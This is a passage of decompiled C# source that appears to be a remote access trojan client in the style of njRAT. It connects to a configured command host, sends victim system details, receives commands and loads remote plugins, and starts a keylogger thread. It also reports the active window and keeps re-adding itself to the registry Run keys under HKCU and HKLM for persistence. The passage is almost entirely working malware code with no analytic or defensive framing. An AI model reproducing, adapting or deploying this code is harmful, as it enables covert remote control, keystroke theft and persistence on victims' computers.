                                                                        b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(p[0]))), typeof(byte[]));
                                                                        pLG = true;
                                                                    }
                                                                }
                                                            }
                                                            else
                                                            {
                                                                flag2 = (Operators.CompareString(str, "PLG", false) == 0);
                                                                if (flag2)
                                                                {
                                                                    MemoryStream memoryStream7 = new MemoryStream();
                                                                    int length3 = (strArrays[0] + OK.Y).Length;
                                                                    memoryStream7.Write(b, length3, b.Length - length3);
                                                                    OK.PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(OK.Decompress(memoryStream7.ToArray()), "A"))));
                                                                    object obj2 = RuntimeHelpers.GetObjectValue(OK.PLG);
                                                                    object[] p = new object[]
															{
																OK.H
															};
                                                                    NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(obj2), null, "H", p, null, null);
                                                                    object pLG3 = RuntimeHelpers.GetObjectValue(OK.PLG);
                                                                    p = new object[]
															{
																OK.P
															};
                                                                    NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(pLG3), null, "P", p, null, null);
                                                                    object obj3 = RuntimeHelpers.GetObjectValue(OK.PLG);
                                                                    p = new object[]
															{
																OK.C
															};
                                                                    NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(obj3), null, "c", p, null, null);
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception expr_E63)
                    {
                        ProjectData.SetProjectError(expr_E63);
                        Exception exception10 = expr_E63;
                        bool flag2 = (strArrays.Length > 0 && Operators.CompareString(strArrays[0], "Ex", false) == 0) | Operators.CompareString(strArrays[0], "PLG", false) == 0;
                        if (flag2)
                        {
                            OK.PLG = null;
                        }
                        try
                        {
                            string[] y = new string[]
					{
						"ER",
						OK.Y,
						strArrays[0],
						OK.Y,
						exception10.Message
					};
                            OK.Send(string.Concat(y));
                        }
                        catch (Exception expr_EF9)
                        {
                            ProjectData.SetProjectError(expr_EF9);
                            ProjectData.ClearProjectError();
                        }
                        ProjectData.ClearProjectError();
                    }
                    pLG = false;
                }
            }

            public static string MD5(byte[] B)
            {
                B = new MD5CryptoServiceProvider().ComputeHash(B);
                string str = "";
                byte[] numArray = B;
                int index = 0;
                while (index < numArray.Length)
                {
                    byte num = numArray[index];
                    str = str + num.ToString("x2");
                    checked { ++index; }
                }
                return str;
            }
            public static bool Sendb(byte[] b)
            {
                if (!OK.Cn)
                    return false;
                try
                {
                    FileInfo fileInfo = OK.LO;
                    Monitor.Enter((object)fileInfo);
                    try
                    {
                        if (!OK.Cn)
                            return false;
                        MemoryStream memoryStream = new MemoryStream();
                        string S = b.Length.ToString() + "\0";
                        byte[] buffer = OK.SB(ref S);
                        memoryStream.Write(buffer, 0, buffer.Length);
                        memoryStream.Write(b, 0, b.Length);
                        OK.C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
                    }
                    finally
                    {
                        Monitor.Exit((object)fileInfo);
                    }
                }
                catch (Exception ex1)
                {
                    ProjectData.SetProjectError(ex1);
                    try
                    {
                        if (OK.Cn)
                        {
                            OK.Cn = false;
                            OK.C.Close();
                        }
                    }
                    catch (Exception ex2)
                    {
                        ProjectData.SetProjectError(ex2);
                        ProjectData.ClearProjectError();
                    }
                    ProjectData.ClearProjectError();
                }
                return OK.Cn;
            }

            public static bool Send(string S)
            {
                return OK.Sendb(OK.SB(ref S));
            }

            public static bool connect()
            {
                string str = null;
                OK.Cn = false;
                Thread.Sleep(2000);
                FileInfo lO = OK.LO;
                lock (lO)
                {
                    try
                    {
                        bool flag = OK.C != null;
                        if (flag)
                        {
                            try
                            {
                                OK.C.Close();
                                OK.C = null;
                            }
                            catch (Exception expr_48)
                            {
                                ProjectData.SetProjectError(expr_48);
                                ProjectData.ClearProjectError();
                            }
                        }
                        try
                        {
                            OK.MeM.Dispose();
                        }
                        catch (Exception expr_67)
                        {
                            ProjectData.SetProjectError(expr_67);
                            ProjectData.ClearProjectError();
                        }
                    }
                    catch (Exception expr_7A)
                    {
                        ProjectData.SetProjectError(expr_7A);
                        ProjectData.ClearProjectError();
                    }
                    try
                    {
                        OK.MeM = new MemoryStream();
                        OK.C = new TcpClient
                        {
                            ReceiveBufferSize = 204800,
                            SendBufferSize = 204800
                        };
                        OK.C.Client.SendTimeout = 10000;
                        OK.C.Client.ReceiveTimeout = 10000;
                        OK.C.Connect(OK.H, Conversions.ToInteger(OK.P));
                        OK.Cn = true;
                        OK.Send(OK.inf());
                        try
                        {
                            bool flag = !Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")), "", false);
                            if (flag)
                            {
                                string str2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")));
                                str = str + OK.DEB(ref str2) + "\r\n";
                            }
                            else
                            {
                                str = str + OK.DEB(ref OK.VN) + "\r\n";
                            }
                            string[] h = new string[]
					{
						str,
						OK.H,
						":",
						OK.P,
						"\r\n"
					};
                            str = string.Concat(h);
                            str = str + OK.DR + "\r\n";
                            str = str + OK.EXE + "\r\n";
                            str = str + Conversions.ToString(OK.Idr) + "\r\n";
                            str = str + Conversions.ToString(OK.IsF) + "\r\n";
                            str = str + Conversions.ToString(OK.Isu) + "\r\n";
                            str += Conversions.ToString(OK.BD);
                            OK.Send("inf" + OK.Y + OK.ENB(ref str));
                        }
                        catch (Exception expr_259)
                        {
                            ProjectData.SetProjectError(expr_259);
                            Exception exception3 = expr_259;
                            ProjectData.SetProjectError(exception3);
                            ProjectData.ClearProjectError();
                        }
                    }
                    catch (Exception expr_274)
                    {
                        ProjectData.SetProjectError(expr_274);
                        Exception exception4 = expr_274;
                        ProjectData.SetProjectError(exception4);
                        OK.Cn = false;
                        ProjectData.ClearProjectError();
                    }
                }
                return OK.Cn;
            }

            public static void RC()
            {
                while (true)
                {
                    OK.lastcap = "";
                    if (OK.C != null)
                    {
                        long num1 = -1L;
                        int num2 = 0;
                        try
                        {
                            while (true)
                            {
                                do
                                {
                                    checked { ++num2; }
                                    if (num2 == 10)
                                    {
                                        num2 = 0;
                                        Thread.Sleep(1);
                                    }
                                    if (OK.Cn)
                                    {
                                        if (OK.C.Available < 1)
                                            OK.C.Client.Poll(-1, SelectMode.SelectRead);
                                        do
                                        {
                                            if ((uint)OK.C.Available > 0U)
                                            {
                                                if (num1 == -1L)
                                                {
                                                    string str = "";
                                                    while (true)
                                                    {
                                                        int CharCode = OK.C.GetStream().ReadByte();
                                                        switch (CharCode)
                                                        {
                                                            case -1:
                                                                goto label_20;
                                                            case 0:
                                                                goto label_11;
                                                            default:
                                                                str = str + Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                                                                continue;
                                                        }
                                                    }
                                                label_11:
                                                    num1 = Conversions.ToLong(str);
                                                    if (num1 == 0L)
                                                    {
                                                        OK.Send("");
                                                        num1 = -1L;
                                                    }
                                                }
                                                else
                                                    goto label_15;
                                            }
                                            else
                                                goto label_20;
                                        }
                                        while (OK.C.Available > 0);
                                        continue;
                                    label_15:
                                        OK.b = new byte[checked(OK.C.Available + 1)];
                                        long num3 = checked(num1 - OK.MeM.Length);
                                        if ((long)OK.b.Length > num3)
                                            OK.b = new byte[checked((int)(num3 - 1L) + 1)];
                                        int count = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None);
                                        OK.MeM.Write(OK.b, 0, count);
                                    }
                                    else
                                        goto label_20;
                                }
                                while (OK.MeM.Length != num1);
                                num1 = -1L;
                                Thread thread = new Thread((ParameterizedThreadStart)(a0 => OK.Ind((byte[])a0)), 1);
                                thread.Start((object)OK.MeM.ToArray());
                                thread.Join(100);
                                OK.MeM.Dispose();
                                OK.MeM = new MemoryStream();
                            }
                        }
                        catch (Exception ex)
                        {
                            ProjectData.SetProjectError(ex);
                            ProjectData.ClearProjectError();
                        }
                    }
                label_20:
                    do
                    {
                        try
                        {
                            if (OK.PLG != null)
                            {
                                NewLateBinding.LateCall(OK.PLG, (System.Type)null, "clear", new object[0], (string[])null, (System.Type[])null, (bool[])null, true);
                                OK.PLG = (object)null;
                            }
                        }
                        catch (Exception ex)
                        {
                            ProjectData.SetProjectError(ex);
                            ProjectData.ClearProjectError();
                        }
                        OK.Cn = false;
                    }
                    while (!OK.connect());
                    OK.Cn = true;
                }
            }

            public static void ko()
            {
                if (Interaction.Command() != null)
                {
                    try
                    {
                        OK.F.Registry.CurrentUser.SetValue("di", (object)"!");
                    }
                    catch (Exception ex)
                    {
                        ProjectData.SetProjectError(ex);
                        ProjectData.ClearProjectError();
                    }
                    Thread.Sleep(5000);
                }
                bool createdNew = false;
                OK.MT = (object)new Mutex(true, OK.RG, out createdNew);
                if (!createdNew)
                    ProjectData.EndApp();
                OK.INS();
                if (!OK.Idr)
                {
                    OK.EXE = OK.LO.Name;
                    OK.DR = OK.LO.Directory.Name;
                }
                new Thread(new ThreadStart(OK.RC), 1).Start();
                try
                {
                    OK.kq = new kl();
                    new Thread(new ThreadStart(OK.kq.WRK), 1).Start();
                }
                catch (Exception ex)
                {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                }
                int num = 0;
                string Left = "";
               
                while (true)
                {
                    Thread.Sleep(1000);
                    if (!OK.Cn)
                        Left = "";
                    Application.DoEvents();
                    try
                    {
                        checked { ++num; }
                        if (num == 5)
                        {
                            try
                            {
                                Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
                            }
                            catch (Exception ex)
                            {
                                ProjectData.SetProjectError(ex);
                                ProjectData.ClearProjectError();
                            }
                        }
                        if (num >= 8)
                        {
                            num = 0;
                            string Right = OK.ACT();
                            if (Operators.CompareString(Left, Right, false) != 0)
                            {
                                Left = Right;
                                OK.Send("act" + OK.Y + Right);
                            }
                        }
                        if (OK.Isu)
                        {
                            try
                            {
                                if (Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.CurrentUser.GetValue(OK.sf + "\\" + OK.RG, (object)""), (object)("\"" + OK.LO.FullName + "\" .."), false))
                                    OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object)("\"" + OK.LO.FullName + "\" .."));
                            }
                            catch (Exception ex)
                            {
                                ProjectData.SetProjectError(ex);
                                ProjectData.ClearProjectError();
                            }
                            try
                            {
                                if (Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.LocalMachine.GetValue(OK.sf + "\\" + OK.RG, (object)""), (object)("\"" + OK.LO.FullName + "\" .."), false))
                                    OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object)("\"" + OK.LO.FullName + "\" .."));
                            }
                            catch (Exception ex)
                            {
                                ProjectData.SetProjectError(ex);
                                ProjectData.ClearProjectError();
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        ProjectData.SetProjectError(ex);
                        ProjectData.ClearProjectError();
                    }
                }
            }
        }
    }